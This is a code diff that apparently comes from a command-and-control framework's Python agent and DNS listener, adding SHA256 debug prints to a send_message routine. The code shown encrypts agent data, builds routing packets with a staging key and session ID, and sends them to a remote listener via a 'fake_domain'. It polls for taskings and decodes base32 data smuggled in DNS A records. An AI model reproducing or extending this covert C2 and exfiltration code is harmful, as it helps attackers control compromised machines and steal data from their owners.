@@ -533,20 +533,23 @@ def send_message(packets=None):
 
     iprecv = ""
     data = None
-    routingPacket = ""
 
     if packets:
         print "[AGENT] in send_message() WITH packets to send"
         data = ''.join(packets)
         # aes_encrypt_then_hmac is in stager.py
         encData = aes_encrypt_then_hmac(key, data)
-        routingPacket = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
+        data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
+        ip_recv=send_data_to_listener(taskinghostname, sock, host, port, data, fake_domain)
     else:
         print "[AGENT] in send_message() WITHOUT packets to send"
         # we have no packets to send, ask listener for new taskings
         routingPacket = build_routing_packet(stagingKey, sessionID, meta=4)
+        ip_recv=send_data_to_listener(taskinghostname, sock, host, port, routingPacket, fake_domain)
 
-    ip_recv=send_data_to_listener(taskinghostname, sock, host, port, routingPacket, fake_domain)
+    if data:
+        m = hashlib.sha256(data)
+        print '[AGENT] data {}'.format(m.hexdigest())
 
     try:
         print "[AGENT] main control loop"
@@ -633,6 +636,8 @@ def send_message(packets=None):
                 a_base32 = a_base32+a_array[0]+a_array[1]
         print a_base32
         a_decode=base64.b32decode(a_base32)
+        m = hashlib.sha256(a_decode)
+        print 'a_decode {}'.format(m.hexdigest())
 
         return a_decode
     
@@ -777,6 +782,9 @@ def send_message(packets=None):
             self.send_a_record_reply_id(sock, a_host, ipack, server_dns, a_dns.id, a_dns.qd)
         print "[PROCESS] About to decode {}".format(a_base32)
         routingPacket = base64.b32decode(a_base32)
+        m = hashlib.sha256(routingPacket)
+        print "[PROCESS] SHA256 of routingPacket {}".format(m.hexdigest())
+        
         dataResults = self.mainMenu.agents.handle_agent_data(stagingKey, routingPacket, listenerOptions, addr[0])
 
         if dataResults and len(dataResults) > 0:
